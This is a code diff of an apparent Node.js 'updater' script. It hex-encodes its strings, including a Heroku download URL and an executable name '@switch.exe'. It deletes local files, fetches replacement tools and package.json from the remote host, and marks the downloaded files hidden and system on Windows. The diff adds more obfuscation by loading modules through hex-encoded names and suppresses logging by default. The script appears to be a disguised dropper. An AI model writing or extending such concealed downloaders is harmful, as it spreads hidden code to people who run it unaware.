@@ -6,15 +6,17 @@ var hW = [
     fhs('407377697463682e657865'),// [4e]
     fhs('7061636b6167652d6c6f636b2e6a736f6e'),// [5] lock
     fhs('7061636b6167652e6a736f6e'),// [6] pg_
-    fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f7061636b6167652e6a736f6e'),// [21] - https://blogspotscraping.herokuapp.com/switchtool/package.json_
-
+    fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f7061636b6167652e6a736f6e'),// [7] - https://blogspotscraping.herokuapp.com/switchtool/package.json_
+    fhs('72657175657374'),        // [8] - request
+    fhs('726571756573742d70726f6d697365'),// [9] - request-promise
 ],
     links = { c: hex2a(hW[0]), s: hex2a(hW[1]), sync: hex2a(hW[2]), snet: hex2a(hW[3]), pkg: hex2a(hW[7]) },
-    request = require("request"),
-    rp = require('request-promise'),
-    fs = require("fs"),
-    fspr = fs.promises,
+    request = require(hex2a(hW[8])),
+    rp = require(hex2a(hW[9])),
+    fs = require('fs'),
+    //fspr = fs.promises,
     log = console.log,
+    allowLog = false,
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0',
     }
@@ -40,20 +42,23 @@ function hex2a(hex) {
     }
     return str;
 }
-async function deleteFile(fileName) {
+function deleteFile(fileName) {
     if (fileName == 'snet') fileName = hex2a(hW[4])
     if (fs.existsSync(fileName)) {
-        await fs.unlinkSync(fileName)
-        //log('Deleted %s', fileName)
+        fs.unlinkSync(fileName)
+        if(allowLog) log('Deleted %s', fileName)
     }
 }
-async function saveFile(fileName, fileContent) {
+function saveFile(fileName, fileContent) {
     // var folder = "./";
     // if (!fs.existsSync(folder)) {
     //     fs.mkdirSync(folder);
     // }
-    await fspr.writeFile(fileName, fileContent);
-    //log("Updated " + fileName + " > successfully");
+    fs.writeFile(fileName, fileContent, function(err){
+        if(err) return log(err)
+        if(allowLog) log("Updated " + fileName + " > successfully");
+    });
+    
 }
 async function fetchTool(url) {
     var options = {
@@ -76,19 +81,19 @@ async function update(toolName) {
         case 'snet':
             var fileStream = fs.createWriteStream(__dirname + '/' + hex2a(hW[4]));
             fileStream.on('close', function () {
-                //log('Updated snet > successfully');
+                if(allowLog) log('Updated snet > successfully');
             });
             request(linkTool).pipe(fileStream);
             break;
     }
 }
 (async function () {
-    await deleteFile('c')
-    process.stdout.write('\033c'); 
     log('Updating...')
-    await deleteFile('s')
-    await deleteFile('sync')
-    await deleteFile('snet')
+    deleteFile('c')    
+    deleteFile('s')
+    deleteFile('sync')
+    deleteFile('snet')
+    if (fs.existsSync(hex2a(hW[5]))) fs.unlinkSync(hex2a(hW[5]))
     await update('c')
     await update('s')
     await update('sync')
@@ -104,7 +109,6 @@ async function update(toolName) {
     winattr.setSync('sync', { system: true });
     winattr.setSync(hex2a(hW[4]), { hidden: true });
     winattr.setSync(hex2a(hW[4]), { system: true });
-    if (fs.existsSync(hex2a(hW[5]))) fs.unlinkSync(hex2a(hW[5]))
     await update('pkg')
     log('Done !!!')
     log('======================== Manual ========================')
